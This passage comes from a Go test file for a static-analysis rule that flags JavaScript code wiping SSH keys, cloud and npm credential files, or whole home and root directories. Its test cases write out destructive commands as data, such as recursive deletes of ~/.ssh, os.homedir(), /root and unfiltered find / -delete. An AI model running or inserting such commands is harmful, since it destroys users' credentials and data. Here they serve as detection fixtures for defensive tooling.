+			content: "require('child_process').execSync(\"find ~/.ssh -name '*-delete'\");\n",
+			want:    false,
+		},
+		{
+			// codex round 18 #1: a concatenated -c script is dynamic; the
+			// sibling .ssh.bak suffix must not be read as .ssh.
+			name:    "spawn sh -c concat script ('rm -rf ~/.ssh' + '.bak') is not a wipe",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'rm -rf ~/.ssh' + '.bak']);\n",
+			want:    false,
+		},
+		{
+			// codex round 18 #2: in an fs path * is a literal byte, so .ssh* is
+			// a different file than .ssh.
+			name:    "fs.rmSync('/home/u/.ssh*') literal glob byte is not .ssh",
+			content: "const fs = require('fs');\nfs.rmSync('/home/u/.ssh*', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 19 #2: a concatenated execaCommand is dynamic.
+			name:    `execaCommand('sh -c "rm -rf ~/.ssh"' + '.bak') concat is not a wipe`,
+			content: "const { execaCommand } = require('execa');\nawait execaCommand('sh -c \"rm -rf ~/.ssh\"' + '.bak');\n",
+			want:    false,
+		},
+		{
+			// PR scope (spec): a direct program-API delete spawn('rm', [...])
+			// is intentionally out of scope (no argv parsing) and stays quiet.
+			name:    "spawn('rm', ['-rf', '/home/u/.ssh']) program-API delete is out of scope",
+			content: "const cp = require('child_process');\ncp.spawnSync('rm', ['-rf', '/home/u/.ssh']);\n",
+			want:    false,
+		},
+		{
+			// codex round 20 #1: an fs path with a method-call tail is dynamic.
+			name:    "fs.rmSync('.ssh'.replace(...)) method-call tail is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh'.replace('.ssh', '.ssh.bak'), { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 20 #2: an argv -c script with a method-call tail.
+			name:    "spawn sh -c script with .replace tail is not a wipe",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'rm -rf ~/.ssh'.replace('.ssh', '.ssh.bak')]);\n",
+			want:    false,
+		},
+		{
+			// codex round 20 #3: a delete inside backtick command substitution
+			// is executed.
+			name:    "shell echo `rm -rf ~/.ssh` command substitution -> HIGH",
+			content: "require('child_process').execSync('echo `rm -rf ~/.ssh`');\n",
+			want:    true,
+		},
+		{
+			// codex round 21 #1: a shell glob expands, so rm -rf ~/.ssh* can
+			// delete ~/.ssh (the * is a boundary for shell, literal for fs).
+			name:    "shell rm -rf ~/.ssh* glob -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.ssh*');\n",
+			want:    true,
+		},
+		{
+			// review P1: unlink cannot remove a directory, so unlinkSync of a
+			// home directory is inert, not a broad wipe.
+			name:    "fs.unlinkSync('/home/dev') cannot remove a directory",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/dev');\n",
+			want:    false,
+		},
+		{
+			// review P1: unlink of literal root is inert.
+			name:    "fs.unlinkSync('/') cannot remove root",
+			content: "const fs = require('fs');\nfs.unlinkSync('/');\n",
+			want:    false,
+		},
+		{
+			// review P1: unlink of a credential-store directory is inert.
+			name:    "fs.unlinkSync('.ssh') (a directory) is inert",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh');\n",
+			want:    false,
+		},
+		{
+			// review P1: removeSync is fs-extra, not core fs, so a core fs
+			// binding cannot call it.
+			name:    "core fs.removeSync('.ssh') is not a real method",
+			content: "const fs = require('fs');\nfs.removeSync('.ssh');\n",
+			want:    false,
+		},
+		{
+			// review P1 regression: fs-extra binding CAN call removeSync.
+			name:    "fs-extra removeSync('.ssh') -> HIGH",
+			content: "const fse = require('fs-extra');\nfse.removeSync('.ssh');\n",
+			want:    true,
+		},
+		{
+			// review P1 regression: unlink of a FILE inside a sensitive dir is a
+			// real delete (the target is a file, not the directory).
+			name:    "fs.unlinkSync('.ssh/id_rsa') (a file) -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh/id_rsa');\n",
+			want:    true,
+		},
+		{
+			// review P2: a backtick template `${HOME}` is JS interpolation of a
+			// JS const, not a shell variable, so the command is dynamic.
+			name:    "execSync template literal ${HOME}/.npmrc is JS interpolation, not shell",
+			content: "const HOME = '/tmp/build';\nrequire('child_process').execSync(`rm -rf ${HOME}/.npmrc`);\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: fs.rm without { recursive: true } cannot remove
+			// a populated home directory, so it is not a broad wipe.
+			name:    "fs.rmSync(os.homedir()) without recursive cannot wipe home",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir());\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: fs.rm without recursive cannot remove the .ssh
+			// directory.
+			name:    "fs.rmSync('.ssh') without recursive cannot remove a directory",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: shell rm without -r cannot remove a directory.
+			name:    "shell rm ~/.ssh without -r cannot remove a directory",
+			content: "require('child_process').execSync('rm ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: rmdir removes only empty/final dirs, so rmdir of
+			// root (always populated) is inert, not a broad wipe.
+			name:    "shell rmdir / is not a recursive broad wipe",
+			content: "require('child_process').execSync('rmdir /');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: fs.rmdirSync of root cannot recursively wipe.
+			name:    "fs.rmdirSync('/') is not a recursive broad wipe",
+			content: "const fs = require('fs');\nfs.rmdirSync('/');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1 positive: rm -rf is recursive, so ~/.ssh fires.
+			name:    "shell rm -rf ~/.ssh recursive directory delete -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// review round 2 P1 positive: fs.rm with { recursive: true } removes
+			// the .ssh directory.
+			name:    "fs.rmSync('.ssh', { recursive: true }) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 2 P1 positive: recursive rm of the home root is a
+			// broad wipe -> CRITICAL.
+			name:    "fs.rmSync(os.homedir(), { recursive: true }) broad wipe -> CRITICAL",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: true, force: true });\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 2 capability check: rmdir is directory-final capable,
+			// so attempting to remove the .ssh directory fires.
+			name:    "shell rmdir ~/.ssh (directory-final) -> HIGH",
+			content: "require('child_process').execSync('rmdir ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// review round 2 capability check: a flag-less rm still deletes a
+			// FILE, so a home-anchored credential file fires.
+			name:    "shell rm ~/.npmrc (a file, no -r needed) -> HIGH",
+			content: "require('child_process').execSync('rm ~/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 3 P2: { recursive: false } does not enable recursion,
+			// so it cannot remove a directory.
+			name:    "fs.rmSync('.ssh', { recursive: false }) cannot remove a directory",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: false });\n",
+			want:    false,
+		},
+		{
+			// review round 3 P2: { recursive: false } cannot wipe the home root.
+			name:    "fs.rmSync(os.homedir(), { recursive: false }) cannot wipe home",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: false });\n",
+			want:    false,
+		},
+		{
+			// review round 3 P2: a trailing slash still names the directory, so
+			// unlink (file-only) cannot remove it.
+			name:    "fs.unlinkSync('/home/u/.ssh/') trailing slash is still the directory",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/u/.ssh/');\n",
+			want:    false,
+		},
+		{
+			// review round 3 P2: shell rm without -r cannot remove ~/.ssh/ even
+			// with a trailing slash.
+			name:    "shell rm ~/.ssh/ trailing slash without -r cannot remove a directory",
+			content: "require('child_process').execSync('rm ~/.ssh/');\n",
+			want:    false,
+		},
+		{
+			// review round 3 positive: a recursive rm of ~/.ssh/ (trailing slash)
+			// still fires.
+			name:    "shell rm -rf ~/.ssh/ trailing slash recursive -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.ssh/');\n",
+			want:    true,
+		},
+		{
+			// review round 3 positive: a quoted recursive option key still grants
+			// recursion.
+			name:    "fs.rmSync('.aws', { \"recursive\": true }) quoted key -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.aws', { \"recursive\": true });\n",
+			want:    true,
+		},
+		{
+			// review round 4 P2: a relative fixture path that merely contains a
+			// `home` segment is not home-anchored, so a project-capable file
+			// (.npmrc) needs a partner.
+			name:    "relative vendor/home/user/.npmrc is not home-anchored",
+			content: "const fs = require('fs');\nfs.unlinkSync('vendor/home/user/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: same for a `Users` segment in a relative path.
+			name:    "relative fixtures/Users/alice/.env is not home-anchored",
+			content: "const fs = require('fs');\nfs.unlinkSync('fixtures/Users/alice/.env');\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: fs/promises has no *Sync methods, so the call
+			// does not exist and deletes nothing.
+			name:    "fs/promises alias rmSync does not exist",
+			content: "const fs = require('fs/promises');\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: fs.promises namespace rmSync does not exist.
+			name:    "fs.promises namespace rmSync does not exist",
+			content: "const fs = require('fs');\nfs.promises.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: { promises: fsp } rename, then a *Sync method.
+			name:    "destructured promises rename rmSync does not exist",
+			content: "const { promises: fsp } = require('fs');\nfsp.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 4 positive: the async fs/promises rm DOES exist and
+			// deletes the directory.
+			name:    "fs/promises alias rm (async) -> HIGH",
+			content: "const fs = require('fs/promises');\nfs.rm('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 4 positive: an ABSOLUTE home prefix still anchors a
+			// project-capable file.
+			name:    "absolute /home/dev/.npmrc is home-anchored -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/dev/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 5 P2: a *Sync local destructured from fs/promises does
+			// not exist (fs/promises is async-only).
+			name:    "destructured { rmSync } from fs/promises does not exist",
+			content: "const { rmSync } = require('fs/promises');\nrmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 5 P2 positive: the async { rm } destructure DOES exist.
+			name:    "destructured { rm } from fs/promises (async) -> HIGH",
+			content: "const { rm } = require('fs/promises');\nrm('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 5 P2: an UNFILTERED find -delete wipes the whole root,
+			// so find $HOME -delete is a broad home wipe -> CRITICAL.
+			name:    "shell find $HOME -delete unfiltered broad wipe -> CRITICAL",
+			content: "require('child_process').execSync('find $HOME -delete');\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 5 P2: find / -delete is a root wipe.
+			name:    "shell find / -delete unfiltered root wipe -> CRITICAL",
+			content: "require('child_process').execSync('find / -delete');\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 5: a FILTERED find narrows the delete to matched
+			// files, so the broad root is not itself a wipe.
+			name:    "shell find $HOME -name '*.log' -delete is filtered, not a broad wipe",
+			content: "require('child_process').execSync('find $HOME -name \"*.log\" -delete');\n",
+			want:    false,
+		},
+		{
+			// review round 5 P2: a `$HOME`/`~` past the first token char is not a
+			// home anchor; the path is relative.
+			name:    "shell rm -f build$HOME/.npmrc is not home-anchored",
+			content: "require('child_process').execSync('rm -f build$HOME/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// review round 5 P2: same for a `~` mid-token.
+			name:    "shell rm -f foo~/.npmrc is not home-anchored",
+			content: "require('child_process').execSync('rm -f foo~/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// review round 5 positive: a real ~-anchored credential file fires.
+			name:    "shell rm ~/.npmrc (home-anchored file) -> HIGH",
+			content: "require('child_process').execSync('rm ~/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 6 P2: a combined fs/promises import records the
+			// default alias as promises-only, so its *Sync method does not exist.
+			name:    "combined import fsp, { rm } from fs/promises -> rmSync does not exist",
+			content: "import fsp, { rm } from 'node:fs/promises';\nfsp.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 6 positive: the async rm on the combined-import alias
+			// DOES exist.
+			name:    "combined import fsp from fs/promises -> fsp.rm (async) -> HIGH",
+			content: "import fsp, { stat } from 'fs/promises';\nfsp.rm('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 7 P2: /root is root's home dir (common when hooks run
+			// as root in containers/CI), so a recursive wipe is CRITICAL.
+			name:    "fs.rmSync('/root', { recursive: true }) wipes root's home -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync('/root', { recursive: true });\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 7 P2: shell rm -rf /root broad wipe.
+			name:    "shell rm -rf /root broad wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /root');\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 7 P2: a file under /root is home-anchored.
+			name:    "fs.unlinkSync('/root/.npmrc') is home-anchored -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('/root/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 7 boundary: /rootkit is not /root.
+			name:    "shell rm -rf /rootkit is not a home wipe",
+			content: "require('child_process').execSync('rm -rf /rootkit');\n",
+			want:    false,
+		},
+		{
+			// review round 8 P2: a combined import naming a *Sync method
+			// (`import fsp, { rmSync } from 'fs/promises'`) is still promises-only,
+			// so the method does not exist.
+			name:    "combined import { rmSync } from fs/promises does not exist",
+			content: "import fsp, { rmSync } from 'fs/promises';\nrmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 8 P2: a nested recursive:true under a top-level
+			// recursive:false does not enable Node's recursive removal.
+			name:    "nested recursive:true under top-level false cannot remove a directory",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: false, retry: { recursive: true } });\n",
+			want:    false,
+		},
+		{
+			// review round 8 positive: a top-level recursive:true alongside a
+			// nested object still fires.
+			name:    "top-level recursive:true with a nested object -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true, retry: { x: 1 } });\n",
+			want:    true,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			got := hasRule(findings, RuleWiperTripwire)
+			if got != c.want {
+				t.Fatalf("JS_WIPER_TRIPWIRE_001 present = %v, want %v (findings: %+v)", got, c.want, findings)
+			}
+			if c.want {
+				f := findRule(findings, RuleWiperTripwire)
+				if c.crit && f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+				if !c.crit && f.Severity != types.SeverityHigh {
+					t.Errorf("expected HIGH, got %+v", f)
+				}
+			}
+		})
+	}
+}
